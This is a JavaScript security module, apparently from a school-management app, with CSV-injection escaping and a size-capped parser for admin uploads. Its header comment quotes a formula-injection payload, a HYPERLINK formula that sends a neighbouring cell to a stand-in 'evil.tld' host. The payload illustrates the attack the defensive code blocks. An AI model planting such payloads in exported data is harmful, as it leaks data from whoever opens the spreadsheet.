/**
 * src/lib/security/csv.js
 * ─────────────────────────────────────────────────────────────────────────────
 * Safe CSV primitives: injection-proof cell escaping and size-capped parsing.
 *
 * Why?
 *   1. CSV injection: a cell starting with `= + - @` is interpreted as a
 *      formula by Excel/Google Sheets. An attacker can register a scholar
 *      named `=HYPERLINK("http://evil.tld/x?"&A1,"click")` and when the
 *      school proprietor exports the class roster, the formula fires and
 *      exfiltrates the adjacent cell. We prepend a single quote to neutralise.
 *   2. DoS via large uploads: `file.arrayBuffer()` with no size cap lets an
 *      admin (or a stolen admin session) upload a multi-GB file that OOMs
 *      the serverless host. The parser caps bytes AND rows.
 *
 * Usage (escape on export):
 *   import { escapeCsvCell } from '@/lib/security/csv';
 *   const row = [escapeCsvCell(name), escapeCsvCell(email)].join(',');
 *
 * Usage (parse on import):
 *   const { rows, truncated } = await parseCsvSafe(file, {
 *     maxBytes: 2 * 1024 * 1024, // 2 MB
 *     maxRows: 5000,
 *   });
 * ─────────────────────────────────────────────────────────────────────────────
 */

const FORMULA_PREFIXES = /^[=+\-@\t\r]/;

/**
 * escapeCsvCell(value)
 * - Coerces to string
 * - Prepends `'` if value begins with a formula-trigger character
 * - Escapes embedded double quotes by doubling them
 * - Wraps in double quotes if the value contains `,`, `"`, newline or tab
 */
export function escapeCsvCell(value) {
  if (value === null || value === undefined) return '';
  let s = String(value);

  if (FORMULA_PREFIXES.test(s)) {
    s = `'${s}`;
  }

  const needsQuoting = /[",\r\n\t]/.test(s);
  if (needsQuoting) {
    s = `"${s.replace(/"/g, '""')}"`;
  }
  return s;
}

/**
 * escapeCsvRow(cells) - array of values -> safe CSV line
 */
export function escapeCsvRow(cells) {
  return cells.map(escapeCsvCell).join(',');
}

/**
 * Minimal RFC-4180 compatible CSV parser. Pure JS, no deps.
 * Handles:
 *   - quoted fields (`"a,b"`)
 *   - escaped quotes inside quoted fields (`""`)
 *   - CRLF and LF line endings
 *   - trailing newline (optional)
 *   - arbitrary header row (returned as first row)
 *
 * Does NOT handle comments, BOM-stripped UTF-16, or exotic delimiters; if
 * the platform ever needs those, swap to `csv-parse` but keep this for the
 * hot path (admin upload) where minimising attack surface is the point.
 */
function parseCsvText(text) {
  const rows = [];
  let row = [];
  let field = '';
  let inQuotes = false;
  let i = 0;
  const n = text.length;

  while (i < n) {
    const ch = text[i];

    if (inQuotes) {
      if (ch === '"') {
        if (text[i + 1] === '"') {
          field += '"';
          i += 2;
          continue;
        }
        inQuotes = false;
        i += 1;
        continue;
      }
      field += ch;
      i += 1;
      continue;
    }

    if (ch === '"') {
      inQuotes = true;
      i += 1;
      continue;
    }
    if (ch === ',') {
      row.push(field);
      field = '';
      i += 1;
      continue;
    }
    if (ch === '\n' || ch === '\r') {
      row.push(field);
      field = '';
      rows.push(row);
      row = [];
      // Eat CRLF as a pair
      if (ch === '\r' && text[i + 1] === '\n') i += 2;
      else i += 1;
      continue;
    }
    field += ch;
    i += 1;
  }

  // Flush last field / row if no trailing newline
  if (field.length > 0 || row.length > 0) {
    row.push(field);
    rows.push(row);
  }

  return rows;
}

/**
 * parseCsvSafe(fileOrBlob, { maxBytes, maxRows })
 *
 * Accepts a `File`, `Blob`, or `ArrayBuffer`. Rejects uploads larger than
 * `maxBytes`. Truncates at `maxRows` and flags the result as `truncated: true`
 * so the caller can decide whether to reject or process what fit.
 *
 * Returns: { headers: string[], rows: Record<string, string>[], truncated: boolean, rawRows: string[][] }
 */
export async function parseCsvSafe(
  fileOrBlob,
  { maxBytes = 2 * 1024 * 1024, maxRows = 5000 } = {}
) {
  if (!fileOrBlob) throw new Error('parseCsvSafe: no input');

  let buffer;
  if (typeof fileOrBlob.arrayBuffer === 'function') {
    // Enforce size cap BEFORE reading the full buffer where possible. On
    // Node/Next the File wrapper exposes `.size` before `.arrayBuffer()`.
    if (
      typeof fileOrBlob.size === 'number' &&
      fileOrBlob.size > maxBytes
    ) {
      const err = new Error('csv_too_large');
      err.code = 'csv_too_large';
      err.limit = maxBytes;
      err.size = fileOrBlob.size;
      throw err;
    }
    buffer = await fileOrBlob.arrayBuffer();
  } else if (fileOrBlob instanceof ArrayBuffer) {
    buffer = fileOrBlob;
  } else {
    throw new Error('parseCsvSafe: unsupported input type');
  }

  if (buffer.byteLength > maxBytes) {
    const err = new Error('csv_too_large');
    err.code = 'csv_too_large';
    err.limit = maxBytes;
    err.size = buffer.byteLength;
    throw err;
  }

  const text = new TextDecoder('utf-8', { fatal: false }).decode(
    new Uint8Array(buffer)
  );

  const raw = parseCsvText(text);
  const truncated = raw.length > maxRows + 1; // +1 for header
  const clipped = truncated ? raw.slice(0, maxRows + 1) : raw;

  if (clipped.length === 0) {
    return { headers: [], rows: [], truncated: false, rawRows: [] };
  }

  const headers = clipped[0].map((h) => String(h).trim());
  const rows = clipped.slice(1).map((r) => {
    const obj = {};
    headers.forEach((h, idx) => {
      obj[h] = r[idx] !== undefined ? String(r[idx]) : '';
    });
    return obj;
  });

  return { headers, rows, truncated, rawRows: clipped };
}
